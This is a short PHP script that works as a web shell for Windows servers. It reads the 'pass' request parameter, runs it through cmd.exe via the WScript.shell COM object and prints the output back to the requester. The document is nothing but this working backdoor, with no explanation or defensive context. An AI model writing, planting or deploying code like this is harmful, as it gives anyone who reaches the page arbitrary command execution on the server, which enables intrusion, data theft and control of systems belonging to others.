<?php 



$command=$_REQUEST['pass'];
$wsh = new COM('WScript.shell');

$exec = $wsh->exec("cmd.exe /c".$command);

$stdout = $exec->StdOut();

$stringput = $stdout->ReadALL();

print($stringput);

 ?>